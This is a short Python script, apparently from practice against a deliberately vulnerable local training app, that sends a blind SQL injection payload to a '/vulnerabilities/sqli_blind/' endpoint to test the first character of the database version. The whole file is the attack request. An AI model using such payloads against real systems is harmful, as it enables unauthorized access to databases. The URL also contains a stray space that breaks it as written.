import requests
import urllib.parse

URL='http:// localhost:4444/vulnerabilities/sqli_blind/?id=%s&Submit=Submit'
query="' AND SUBSTRING(version(),1,1)='1'#"
query= urllib.parse.quote_plus(query)

r=requests.get(URL%query)
print(r.text)
print(r.status_code)
        
